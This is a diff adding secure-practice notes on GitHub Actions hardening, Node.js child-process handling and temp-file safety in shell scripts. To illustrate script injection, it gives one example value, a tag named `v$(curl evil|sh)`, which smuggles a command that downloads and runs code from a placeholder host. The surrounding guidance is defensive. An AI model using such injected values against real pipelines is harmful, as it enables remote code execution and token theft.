@@ -100,3 +100,18 @@ This note was created based on issues encountered with PyInstaller executables r
 ## Releases
 
 - **A green release rehearsal proves the pipeline, not the artifact.** Install, import or run what the rehearsal built, the way a user will, before tagging (Rule 4, "Rehearse before releasing").
+
+## GitHub Actions Security
+
+- **Declare `permissions: contents: read` at the workflow top level, override per-job where more is needed.** Without an explicit block, jobs inherit the repo's default token permissions, which can be broader than a job actually needs — a compromised step then has more reach than it should. Set the restrictive default once at the top, then add back only what a specific job genuinely needs (e.g. `contents: write` on a release-publishing job).
+- **Pin third-party actions to a full commit SHA, not a version tag.** A tag (`@v4`) can be moved by whoever controls the upstream repo, silently changing what code runs in your workflow — including ones holding a write-capable token (e.g. `GITHUB_TOKEN` in a release job). Resolve the tag to its commit once (`gh api repos/<owner>/<repo>/commits/<tag> --jq .sha`) and pin to that, with the version as a trailing comment (`actions/checkout@<sha> # v7`) so it's still human-readable.
+- **Never interpolate a GitHub expression directly into a `run:` script body.** `run: gh release create "${{ github.ref_name }}"` lets GitHub substitute that value into the script as raw text *before* the shell runs it — a crafted ref/branch/PR-title containing shell syntax (e.g. a tag named `v$(curl evil|sh)`) gets executed, not just printed. Route anything attacker-influenceable (ref names, PR titles/bodies, issue titles, commit messages) through a step `env:` var instead and reference it as a quoted shell variable (`"$RELEASE_TAG"`) — env vars are passed as data, not spliced into the script text.
+
+## Node.js Child Processes
+
+- **Piping two streams into one shared writable ends it when either source ends.** `child.stdout.pipe(logStream)` and `child.stderr.pipe(logStream)` both default to ending `logStream` when *their* source ends — whichever finishes first closes it, and the other stream's next write throws an unhandled write-after-end error. Pipe both with `{ end: false }` and close the shared stream yourself once you know both are done (e.g. on the child's `close` event, which fires after both stdio streams have finished).
+- **A readiness poll must check child liveness and a real success signal, not just "did anything respond."** Polling a fixed URL/port until it answers can resolve on a stray response from an unrelated process already using that port, or on a transient error page the target itself returns while still starting up. Check the child process hasn't already exited (bail out immediately if it has — no point waiting out the full timeout), and only treat a specific expected success response (e.g. HTTP 200, not just "connected") as ready; keep polling past non-200 responses instead of accepting the first one.
+
+## Shell Scripts
+
+- **Don't write to a hardcoded, predictable path under `/tmp`.** On a shared machine another local user can pre-create that exact path (as a file or a symlink elsewhere) before your script runs, letting them read what you write or redirect it to overwrite something else (CWE-377). Use `mktemp` to get a unique, unpredictable path, and `trap 'rm -f "$tmpfile"' EXIT` to clean it up regardless of how the script exits.
